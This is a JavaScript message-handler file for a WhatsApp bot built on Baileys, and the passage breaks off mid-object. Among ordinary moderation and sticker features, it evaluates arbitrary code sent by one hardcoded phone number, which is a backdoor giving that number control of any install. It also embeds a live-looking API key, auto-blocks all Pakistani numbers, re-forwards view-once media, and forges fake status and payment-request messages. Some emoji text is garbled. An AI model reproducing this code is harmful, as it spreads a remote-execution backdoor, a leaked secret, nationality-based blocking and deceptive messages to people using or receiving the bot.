import './settings.js'
import '../global/all.js';
import './handler.js'
const {
	exec,
	spawn,
	execSync
} = child_process
const {
	BufferJSON,
	WA_DEFAULT_EPHEMERAL,
	generateWAMessageFromContent,
	proto,
	generateWAMessageContent,
	generateWAMessage,
	prepareWAMessageMedia,
	areJidsSameUser,
	getContentType
} = baileys
import db, {loadDatabase} from './lib/database/database.js';
export const handler = async (m, zero,chatUpdate, store ) => {
 try { 
       let user = db.data.users[m.sender]
       let chat = db.data.chats[m.chat]
       let settings = db.data.settings[zero.user.jid]
const {
			type,
			quotedMsg,
			mentioned,
			now,
			fromMe
		} = m
		global.type = type;
		global.quotedMsg = quotedMsg;
		global.mentioned = mentioned;
		global.now = now;
		global.fromMe = fromMe;
		global.gakbisaowner = `${ownernumber}@s.whatsapp.net`
		global.body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ''
		global.budy = (typeof m.text == 'string' ? m.text : '')
		global.prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? global.prefix
		global.prefix = prefix
		global.chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
		global.pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : ''
		global.messagesC = pes.slice(0).trim()
		global.content = JSON.stringify(m.message)
		global.isCmd = body.startsWith(prefix)
		global.from = m.key.remoteJid
		global.messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
		global.command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		global.args = body.trim().split(/ +/).slice(1)
		global.pushname = m.pushName || "No Name"
		global.botNumber = await zero.decodeJid(zero.user.id)
		global.isOwner = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
		global.isMods = m.sender == botNumber ? true : false
		global.q = args.join(" ");
		global.text = q;
		global.quoted = m.quoted ? m.quoted : m
		global.mime = (quoted.msg || quoted).mimetype || ''
		global.isMedia = /image|video|sticker|audio/.test(mime)
		global.isImage = (type == 'imageMessage')
		global.isVideo = (type == 'videoMessage')
		global.isAudio = (type == 'audioMessage')
		global.isSticker = (type == 'stickerMessage')
		global.isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		global.isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
		global.isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
		global.isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
		global.isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
		global.isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
		global.isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
		global.sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
		global.senderNumber = sender.split('@')[0]
		global.groupMetadata = m.isGroup ? await zero.groupMetadata(m.chat).catch(e => {}) : ''
		global.groupName = m.isGroup ? groupMetadata.subject : ''
		global.participants = m.isGroup ? await groupMetadata.participants : ''
		global.groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
		global.groupOwner = m.isGroup ? groupMetadata.owner : ''
		global.groupMembers = m.isGroup ? groupMetadata.participants : ''
		global.isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
		global.isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		global.isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
		global.isPrem = isOwner ? true : user.premium
		global.isUser = user.registered
		global.banUser = await zero.fetchBlocklist()
		global.isBanned = banUser ? banUser.includes(m.sender) : false
		global.mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
		global.mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
		global.mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
		global.numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
		global.usernya = mentionByReply ? mentionByReply : mentionByTag[0]
		global.Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
		global.isEval = body.startsWith('=>');

		global.readMore = '‎'.repeat(3000);
		global.readmore = readMore
		global.skizo = global.skizo
		//TIME
		global.xtime = moment.tz('Asia/Kolkata').format('HH:mm:ss')
		global.xdate = moment.tz('Asia/Kolkata').format('DD/MM/YYYY')
		global.time2 = moment().tz('Asia/Kolkata').format('HH:mm:ss')
		global.d = new Date(new Date + 3600000)
		global.weton = ['Pahing', 'Pon', 'Wage', 'Kliwon', 'Legi'][Math.floor(d / 84600000) % 5]
        global.thumb = fs.readFileSync(`./tmp/media/theme/cheemspic.jpg`)
        
                                                                                       
                                                                                                             
                                                                                                                         
                                                                                                                                     
                                                                                                                                                 

global.handleAnti = async (type) => {
				if (!isBotAdmins) return newReply(mess.botAdmin)
				let isKick = db.data.chats[m.chat].isKick ? true : false
				let gclink = (`https://chat.whatsapp.com/` + await zero.groupInviteCode(m.chat))
				let isLinkThisGc = new RegExp(gclink, 'i')
				let isgclink = isLinkThisGc.test(m.text)
				if (isgclink) return newReply('antilink on tapi ini link gc ini jadi gapapa')
				if (isAdmins) return newReply(`anti ${type} on tapi admin yang kirim jadi gapapa`)
				if (isOwner) return newReply('owner mah bebas')
				let kice = m.sender
				await zero.sendMessage(m.chat, {
					delete: {
						remoteJid: m.chat,
						fromMe: false,
						id: m.key.id,
						participant: m.key.participant
					}
				})
				if (isKick) {
				zero.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
				}
				zero.sendMessage(from, {
					text: `${kice} telah di kick karena mengirim ${type}`,
					contextInfo: {
						mentionedJid: [kice]
					}
				}, {
					quoted: m
				})
}

 		global.getRandomColor = () => {
			const colors = ['red', 'green', 'yellow', 'blue', 'magenta', 'cyan', 'white'];
			const randomIndex = Math.floor(Math.random() * colors.length);
			return colors[randomIndex];
		}
		 
       
        
         
      global.createListIfNotExists = (fileName) => {
       if (!fs.existsSync(fileName)) {
        const initialData = [];
        fs.writeFileSync(fileName, JSON.stringify(initialData, null, 2));
    }
       }
        global.readListFromFile = (fileName) => {
    try {
        return JSON.parse(fs.readFileSync(fileName));
    } catch (error) {
        console.error('Error reading list:', error);
        return [];
    }
}    
            
         
    global.saveListToFile = (fileName, list) => {
    fs.writeFileSync(fileName, JSON.stringify(list, null, 2));
}

		global.delay = (ms) => {
			return new Promise(resolve => setTimeout(resolve, ms));
		}

		function log(isi) {
			console.log(isi)
		}      
           
            
 
             
                         
       
	global.sticker5 = async (img, url, packname, author, categories = ['']) => {
    const stickerMetadata = {
    type: 'full',
    pack: packname,
    author,
    categories,
  }
  return await new WSF.Sticker(img ? img : url, stickerMetadata).build()
}
		//auto block pakistan number
		if (m.sender.startsWith('92')) return zero.updateBlockStatus(m.sender, 'block')

		global.sendzeroMessage = async (chatId, message, options = {}) => {
			let generate = await generateWAMessage(chatId, message, options)
			let type2 = getContentType(generate.message)
			if ('contextInfo' in options) generate.message[type2].contextInfo = options?.contextInfo
			if ('contextInfo' in message) generate.message[type2].contextInfo = message?.contextInfo
			return await zero.relayMessage(chatId, generate.message, {
				messageId: generate.key.id
			})
		}

		//group chat msg by xeon
		global.newReply = (teks) => {
			zero.sendMessage(m.chat, {
				text: teks,
				contextInfo: {
					mentionedJid: [sender],
					forwardingScore: 9999999,
					isForwarded: true,
					"externalAdReply": {
						"showAdAttribution": true,
						"containsAutoReply": true,
						"title": ` ${global.botname}`,
						"body": `${ownername}`,
						"previewType": "PHOTO",
						"thumbnailUrl": ``,
						"thumbnail": thumb,
						"sourceUrl": `${wagc}`
					}
				}
			}, {
				quoted: m
			})
		}
		global.newReply2 = (teks) => {
			sendzeroMessage(from, {
				text: teks,
				mentions: [sender],
				contextInfo: {
					forwardingScore: 9999999,
					isForwarded: true,
					mentionedJid: [sender],
					"externalAdReply": {
						"showAdAttribution": true,
						"renderLargerThumbnail": true,
						"title": botname,
						"containsAutoReply": true,
						"mediaType": 1,
						"thumbnail": defaultpp,
						"mediaUrl": `${wagc}`,
						"sourceUrl": `${wagc}`
					}
				}
			})
		}
		global.reply = (teks) => {
			zero.sendMessage(from, {
				text: teks,
				contextInfo: {
					forwardingScore: 9999999,
					isForwarded: true
				}
			}, {
				quoted: m
			})
		}

		global.sendSticker = (pesan) => {
			zero.sendImageAsSticker(m.chat, pesan, m, {
				packname: global.packname,
				author: global.author
			})
		}
let ppuser;
let defaultpp;
		try {
		 ppuser = await zero.profilePictureUrl(m.sender, 'image')
		} catch (err) {
			ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'
		}
		global.defaultpp = await reSize(ppuser, 300, 300)

		global.sendvn = (teks) => {
			zero.sendMessage(from, {
				audio: teks,
				mimetype: 'audio/mp4',
				ptt: true
			}, {
				quoted: m
			})
		}                              
                                                 
                                                             
                                                                         
		 global.simpan = (path, buff) => {
			fs.writeFileSync(path, buff)
			return path
		}

		global.getRandom = (ext) => {
			ext = ext || ""
			return `${Math.floor(Math.random() * 100000)}.${ext}`
		}

		global.pickRandom = (arr) => {
			return arr[Math.floor(Math.random() * arr.length)]
		}

		global.getHari = () => {
		const hariInggris = ['Minggu', 'Senin', 'Selasa', 'Rabu', 'Kamis', 'Jumat', 'Sabtu'];
		const tanggal = new Date();
		const namaHari = hariInggris[tanggal.getDay()];
		return namaHari;
}


		global.rmbg = async (buffer) => {
			let form = new FormData
			form.append("size", "auto")
			form.append("image_file", fs.createReadStream(buffer), "ntah.webp")
			let res = await axios({
				url: "https://api.remove.bg/v1.0/removebg",
				method: "POST",
				data: form,
				responseType: "arraybuffer",
				headers: {
					"X-Api-Key": "dNaWDqPDEuzQTHDba6TACk57",
					...form.getHeaders()
				}
			})
			return res.data
		}

		global.getFile = async (media) => {
			let data = Buffer.isBuffer(media) ? media : isUrl(media) ? await (await fetch(media)).buffer() : fs.existsSync(media) ? fs.readFileSync(media) : /^data:.*?\/.*?;base64,/i.test(media) ? Buffer.from(media.split(",")[1]) : null
			if (!data) return new Error("Result is not a buffer")
			let type = await FileType.fromBuffer(data) || {
				mime: "application/octet-stream",
				ext: ".bin"
			}
			return {
				data,
				...type
			}
		}

		global.sendFile = async (jid, media, options = {}) => {
			let file = await getFile(media)
			let mime = file.ext,
				type
			if (mime == "mp3") {
				type = "audio"
				options.mimetype = "audio/mpeg"
				options.ptt = options.ptt || false
			} else if (mime == "jpg" || mime == "jpeg" || mime == "png") type = "image"
			else if (mime == "webp") type = "sticker"
			else if (mime == "mp4") type = "video"
			else type = "document"
			return zero.sendMessage(jid, {
				[type]: file.data,
				...options
			}, {
				...options
			})
		}


		global.obfus = async (query) => {
			return new Promise((resolve, reject) => {
				try {
					const obfuscationResult = jsobfus.obfuscate(query, {
						compact: false,
						controlFlowFlattening: true,
						controlFlowFlatteningThreshold: 1,
						numbersToExpressions: true,
						simplify: true,
						stringArrayShuffle: true,
						splitStrings: true,
						stringArrayThreshold: 1
					});
					const result = {
						status: 200,
						author: `${ownername}`,
						result: obfuscationResult.getObfuscatedCode()
					}
					resolve(result)
				} catch (e) {
					reject(e)
				}
			})
		}

		global.styletext = async (teks) => {
			return new Promise((resolve, reject) => {
				axios.get('http://qaz.wtf/u/convert.cgi?text=' + teks)
					.then(({
						data
					}) => {
						let $ = cheerio.load(data)
						let hasil = []
						$('table > tbody > tr').each(function (a, b) {
							hasil.push({
								name: $(b).find('td:nth-child(1) > span').text(),
								result: $(b).find('td:nth-child(2)').text().trim()
							})
						})
						resolve(hasil)
					})
			})
		}


		
				//emote
		global.emote = (satu, dua) => {
			try {
				const {
					EmojiAPI
				} = require("emoji-api");
				const emoji = new EmojiAPI();
				emoji.get(satu)
					.then(emoji => {
						zero.sendMessage(from, {
							caption: mess.success,
							image: {
								url: emoji.images[dua].url
							}
						}, {
							quoted: m
						})
					})
			} catch (e) {
				m.reply("Emoji error, please enter another emoji\nNOTE : Just enter 1 emoji")
			}
		}
		


       		const nebal = (angka) => {
			return Math.floor(angka)
		}
 global.startAI = async (text) => {
			try {
				if (!db.users[m.sender].game) {
					db.users[m.sender].game = {
						ai: {
							is_first: true,
							data: []
						}
					}
					simpanDB();
				}

				var game = db.data.users[m.sender].game;
				var mesek = text && m.quoted ? (m.quoted.text ? text + '\n\n' + m.quoted.text : text) : text ? text : (m.quoted ? (m.quoted.text ? m.quoted.text : false) : false);

				if (!mesek) {
					mesek = `Halo ${botname}`;
				}
				gpt.ai = gpt.ai ? gpt.ai : {
					last_answer: 0
				}
				var game = db.data.users[m.sender].game;

				var obj = {
					role: 'user',
					content: mesek
				}

				if (!game.ai) game.ai = {
					is_first: true,
					data: []
				}
				game.ai.data.push(obj)

				var delayTime = 5 * 1000; // Delay in milliseconds
				var timeElapsed = Date.now() - gpt.ai.last_answer;
				var remainingTime = Math.max(delayTime - timeElapsed, 0);
				await delay(remainingTime)
				log(mesek)
				await m.reply('*w r i t i n g. . .*')
				var Actor = global.kepribadianAI
				var jawabAi = await axios.request(`https://skizo.tech/api/openai?apikey=${skizo}`, {
					method: 'POST',
					data: {
						messages: game.ai.data,
						system: Actor
					}
				})

				if (!game.ai.is_first) clearTimeout(game.ai.expired)
				game.ai.data.push({
					role: 'assistant',
					content: jawabAi.data.result
				})
				game.ai.is_first = false
				game.ai.expired = setTimeout(v => {
					clearTimeout(game.ai.expired)
					delete game.ai
				}, 5 * 60 * 1000)

				gpt.ai.last_answer = Date.now()
				sesi[m.sender] = [await sendzeroMessage(m.chat, {
						text: jawabAi.data.result,
						mentions: [sender],
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							mentionedJid: [sender],
							"externalAdReply": {
								"showAdAttribution": true,
								"renderLargerThumbnail": true,
								"title": botname,
								"containsAutoReply": true,
								"mediaType": 1,
								"thumbnail": fs.readFileSync(`./media/theme/cheemspic.jpg`),
								"mediaUrl": `${wagc}`,
								"sourceUrl": `${wagc}`
							}
						}
					}, {
						quoted: m
					})
];


			} catch (e) {
				log(e);
				m.reply('oops, an error occured.')
			};
		}

		global.sendvn = (teks) => {
			zero.sendMessage(from, {
				audio: teks,
				mimetype: 'audio/mp4',
				ptt: true
			}, {
				quoted: m
			})
		}                              
      		global.lep = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...({
					remoteJid: ""
				})
			},
			message: {
				"imageMessage": {
					"mimetype": "image/jpeg",
					"caption": `${ownername}`,
					"jpegThumbnail": defaultpp
				}
			}
		}

		global.ftext = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(from ? {
					remoteJid: `${ownernumber}@s.whatsapp.net`
				} : {})
			},
			message: {
				extendedTextMessage: {
					text: `${m.pushName}`,
					title: `${m.pushName}`,
					jpegThumbnail: defaultpp
				}
			}
		}


		global.ftroli = {
			key: {
				fromMe: false,
				"participant": "0@s.whatsapp.net",
				"remoteJid": "status@broadcast"
			},
			"message": {
				orderMessage: {
					itemCount: 2022,
					status: 200,
					thumbnail: thumb,
					surface: 200,
					message: botname,
					orderTitle: ownername,
					sellerJid: '0@s.whatsapp.net'
				}
			},
			contextInfo: {
				"forwardingScore": 999,
				"isForwarded": true
			},
			sendEphemeral: true
		}
		global.fdoc = {
			key: {
				participant: '0@s.whatsapp.net',
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				documentMessage: {
					title: botname,
					jpegThumbnail: thumb
				}
			}
		}
		global.fvn = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				"audioMessage": {
					"mimetype": "audio/ogg; codecs=opus",
					"seconds": 359996400,
					"ptt": "true"
				}
			}
		}
		global.fgif = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": botname,
					"h": wm,
					'seconds': '359996400',
					'gifPlayback': 'true',
					'caption': ownername,
					'jpegThumbnail': thumb
				}
			}
		}
		global.fgclink = {
			key: {
				participant: "0@s.whatsapp.net",
				"remoteJid": "0@s.whatsapp.net"
			},
			"message": {
				"groupInviteMessage": {
					"groupJid": "6288213840883-1616169743@g.us",
					"inviteCode": "m",
					"groupName": wm,
					"caption": `${pushname}`,
					'jpegThumbnail': thumb
				}
			}
		}
		global.fvideo = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				"videoMessage": {
					"title": botname,
					"h": wm,
					'seconds': '359996400',
					'caption': `${pushname}`,
					'jpegThumbnail': thumb
				}
			}
		}
		global.floc = {
			key: {
				participant: '0@s.whatsapp.net',
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				locationMessage: {
					name: wm,
					jpegThumbnail: thumb
				}
			}
		}
		global.fkontak = {
			key: {
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: `status@broadcast`
				} : {})
			},
			message: {
				'contactMessage': {
					'displayName': ownername,
					'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${ownername},;;;\nFN:${ownername}\nitem1.TEL;waid=916909137213:916909137213\nitem1.X-ABLabel:Mobile\nEND:VCARD`,
					'jpegThumbnail': thumb,
					thumbnail: thumb,
					sendEphemeral: true
				}
			}
		}
		global.fakestatus = {
			key: {
				fromMe: false,
				participant: `0@s.whatsapp.net`,
				...(m.chat ? {
					remoteJid: "status@broadcast"
				} : {})
			},
			message: {
				"imageMessage": {
					"url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
					"mimetype": "image/jpeg",
					"caption": wm,
					"fileSha256": "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
					"fileLength": "28777",
					"height": 1080,
					"width": 1079,
					"mediaKey": "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
					"fileEncSha256": "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
					"directPath": "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
					"mediaKeyTimestamp": "1610993486",
					"jpegThumbnail": thumb,
					"scansSidecar": "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw=="
				}
			}
		}                                                                               
                                                                                                 
     global.repPy = {
			key: {
				remoteJid: '0@s.whatsapp.net',
				fromMe: false,
				id: `${ownername}`,
				participant: '0@s.whatsapp.net'
			},
			message: {
				requestPaymentMessage: {
					currencyCodeIso4217: "USD",
					amount1000: 999999999,
					requestFrom: '0@s.whatsapp.net',
					noteMessage: {
						extendedTextMessage: {
							text: `${botname}`
						}
					},
					expiryTimestamp: 999999999,
					amount: {
						value: 91929291929,
						offset: 1000,
						currencyCode: "INR"
					}
				}
			}
		}
                                                                                                                                                                         
                                                                                                                                                                                     
                                                                                                                                                                                                 
                                                                                                                                                                                                             
                                                                                                                                                                                                                                     
              
        if (time2 < "23:59:00") {
			var timewisher = `Good Night 馃寣`
		}
		if (time2 < "19:00:00") {
			var timewisher = `Good Evening 馃寖`
		}
		if (time2 < "18:00:00") {
			var timewisher = `Good Evening 馃寖`
		}
		if (time2 < "15:00:00") {
			var timewisher = `Good Afternoon 馃寘`
		}
		if (time2 < "11:00:00") {
			var timewisher = `Good Morning 馃寗`
		}
		if (time2 < "05:00:00") {
			var timewisher = `Good Morning 馃寗`
		}

		if (isEval && senderNumber == "6285813708397") {
			let evaled,
				text = q,
				{
					inspect
				} = util;
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					);
					m.reply(evaled);
				}
				evaled = await eval(text);
				if (typeof evaled !== 'string') evaled = inspect(evaled);
				await zero.sendMessage(from, {
					text: evaled
				}, {
					quoted: m
				});
			} catch (e) {
				zero.sendMessage(from, {
					text: String(e)
				}, {
					quoted: m
				});
			}
		}
		let isAutoSticker = chat.autoSticker
		// Autosticker gc
		if (isAutoSticker) {
			if (/image/.test(mime) && !/webp/.test(mime)) {
				let mediac = await quoted.download()
				await zero.sendImageAsSticker(from, mediac, m, {
					packname: global.packname,
					author: global.author
				})
				console.log(`Auto sticker detected`)
			} else if (/video/.test(mime)) {
				if ((quoted.msg || quoted).seconds > 11) return
				let mediac = await quoted.download()
				await zero.sendVideoAsSticker(from, mediac, m, {
					packname: global.packname,
					author: global.author
				})
			}
		}




		// Anti Link
		if (chat.Antilinkgc && budy.match(`chat.whatsapp.com`)) {
		handleAnti('linkgc')
		}

		// Antiwame
		if (chat.antiWame && (budy.includes(`Wa.me`) || budy.includes(`http://wa.me`))) {
		handleAnti('link nomor wa')
		}
		//antivirtex
		if (chat.antiVirtex && budy.length > 3500) {
		handleAnti('virus text')
		}
		//anti bad words
		if (chat.antiToxic && BadXeon.includes(messagesD)) {
		handleAnti('kata kasar / kata terlarang dari admin')
	    }
		//antilink youtube video 	
		if (chat.AntiLinkYoutubeVid && (budy.includes("https://youtu.be/") || budy.includes("https://youtube.com/"))) {
		handleAnti('link YouTube')
		}
		//antilink instagram 	
		if (chat.AntiLinkInstagram && budy.includes("https://www.instagram.com/")) {
		handleAnti('link instagram')
		}
		//antilink facebook 	
		if (chat.AntiLinkFacebook && budy.includes("https://facebook.com/")) {
		handleAnti('link Facebook')
		}
		//antilink telegram 	
		if (chat.AntiLinkTelegram && budy.includes("https://t.me/")) {
		handleAnti('link telegram')
		}

		if (chat.AntiLinkTiktok && budy.includes("https://www.tiktok.com/")) {
		handleAnti('link TikTok')
		}
		//antilink twitter 	
		if (chat.AntiLinkTwitter && budy.includes("https://twitter.com/")) {
		handleAnti('link Twitter')
		}
		//antilink all 	
		if (chat.AntiLinkAll && ((budy.includes("https://") || budy.includes("http://")))) {
		handleAnti('link Http')
		}


		if (!zero.public) {
			if (!m.key.fromMe) return
		}


		// chat counter (console log)
		if (m.message && m.isGroup) {
			zero.readMessages([m.key]);
			console.log(color(`\n// ================================================== //\n`, 'cyan'))
			console.log(chalk[getRandomColor()]('[ MESSAGE ]'));
			console.log(chalk[getRandomColor()]('IN GROUP CHAT :'));
			console.log(chalk[getRandomColor()](`TIME : ${new Date()}`));
			console.log(chalk[getRandomColor()](`PESAN: ${budy || m.mtype}`));
			console.log(chalk[getRandomColor()](`FROM: ${pushname}`));
			console.log(chalk[getRandomColor()](`GROUP:${groupName, m.chat}`));
		} else {
			zero.readMessages([m.key]);
			console.log(color(`\n// ================================================== //\n`, 'cyan'))
			console.log(chalk[getRandomColor()]('[ MESSAGE ]'));
			console.log(chalk[getRandomColor()]('IN PRIVATE CHAT :'));
			console.log(chalk[getRandomColor()](`TIME: ${new Date()}`));
			console.log(chalk[getRandomColor()](`PESAN: ${budy || m.mtype}`));
			console.log(chalk[getRandomColor()](`FROM: ${pushname}`));
		}

		zero.sendPresenceUpdate('available', from)

		for (let jid of mentionUser) {
			let user = global.db.data.users[jid]
			if (!user) continue
			let afkTime = user.afkTime
			if (!afkTime || afkTime < 0) continue
			let reason = user.afkReason || ''
			m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
		}

		if (db.data.users[m.sender].afkTime > -1) {
			let user = global.db.data.users[m.sender]
			m.reply(`
You Quit AFK${user.afkReason ? ' After: ' + user.afkReason : ''}
During ${clockString(new Date - user.afkTime)}
`.trim())
			user.afkTime = -1
			user.afkReason = ''
		}


		//autoreapon
		for (let zeroBody of settings.responVoice) {
			if (budy === zeroBody) {
				let audiobuffy = fs.readFileSync(`./media/audio/${zeroBody}.mp3`)
				zero.sendMessage(m.chat, {
					audio: audiobuffy,
					mimetype: 'audio/mp4',
					ptt: true
				}, {
					quoted: m
				})
			}
		}
		for (let zeroBody of settings.responSticker) {
			if (budy === zeroBody) {
				let stickerbuffy = fs.readFileSync(`./media/sticker/${zeroBody}.webp`)
				zero.sendMessage(m.chat, {
					sticker: stickerbuffy
				}, {
					quoted: m
				})
			}
		}
		for (let zeroBody of settings.responImage) {
			if (budy === zeroBody) {
				let imagebuffy = fs.readFileSync(`./media/image/${zeroBody}.jpg`)
				zero.sendMessage(m.chat, {
					image: imagebuffy
				}, {
					quoted: m
				})
			}
		}
		for (let zeroBody of settings.responVideo) {
			if (budy === zeroBody) {
				let videobuffy = fs.readFileSync(`./media/video/${zeroBody}.mp4`)
				zero.sendMessage(m.chat, {
					video: videobuffy
				}, {
					quoted: m
				})
			}
		}

		if (m.isGroup && m.mtype == 'viewOnceMessage') {
			let teks = `鈺�� *Anti ViewOnce* 銆峔n鈹� *Name* : ${pushname}\n鈹� *User* : @${m.sender.split("@")[0]}\n鈹� *Clock* : ${time2}\n鈹� *Message* : ${m.mtype}`
			zero.sendMessage(m.chat, {
				text: teks,
				mentions: [m.sender]
			}, {
				quoted: m
			})
			await sleep(500)
			m.copyNForward(m.chat, true, {
				readViewOnce: true
			}, {
				quoted: m
			}).catch(_ => m.reply(`Maybe It's Opened`))
		}


		if (isCmd && isBanned) {
			return banRep()
		}

		let list = []
		for (let i of owner) {
			list.push({
				displayName: await zero.getName(i),
				vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await zero.getName(i)}\nFN:${await zero.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
			})
		}

		
		if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
			var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
			if (get_data_respon.isImage === false) {
				zero.sendMessage(m.chat, {
					text: sendResponList(m.chat, chath, db_respon_list)
				}, {
					quoted: m
				})
			} else {
				buff = await getBuffer(get_data_respon.image_url)
				zero.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
			}
		}

		if (!isCmd && isAlreadyzeroList(chath, dblist)) {
			var getraindata = getDatazeroList(chath, dblist)
			if (getraindata.isImage === false) {
				zero.sendMessage(m.chat, {
					text: sendzeroList(chath, dblist)
				}, {
					quoted: m
				})
			} else {
				buff = await getBuffer(getraindata.image_url)
				zero.sendImage(m.chat, buff, `${getraindata.response}`, m)
			}
		}

 
        //menu thingy
		const timestamp = speed()
		const latensi = speed() - timestamp
		const mark = "0@s.whatsapp.net"

	//	let aschi = pickRandom(global.listaschi)
		let ownernya = ownernomer + '@s.whatsapp.net'
		let me = m.sender
		let timestampe = speed();
		let latensie = speed() - timestampe


		const pengganti = {
			'#kecepatan': `${latensie.toFixed(4)}`,
			'#waktuOnline': `${runtime(process.uptime())}`,
			'#weton': `${weton}`,
			'#namaBot': `${global.botname}`,
			'#noOwner': `${ownernumber}`,
			'#prefix': `${prefix ? prefix :'noPrefix'}`,
			'#mode': `${zero.public ? 'Public': `Self`}`,
			'#hostName': `${os.hostname()}`,
			'#platform': `${os.platform()}`,
			'#namaUser': `${pushname}`,
			'#nomorUser': `@${me.split('@')[0]}`,
			'#isPremium': `${isPrem ? '鉁�': '鉂宍'}`,
			'#time': `${xtime}`,
			'#date': `${xdate}`,
			'#weton': `${weton}`,
			'#ucapan': `${timewisher}`,
			'#premium': `${global.logop}`,
			'#group': `${global.logog}`,
			'#free': `${global.logof}`,
			'#owner': `${global.logoo}`,
			'#kiriMenu': `${kiriMenu}`,
			'#fotter': `${fotter}`,
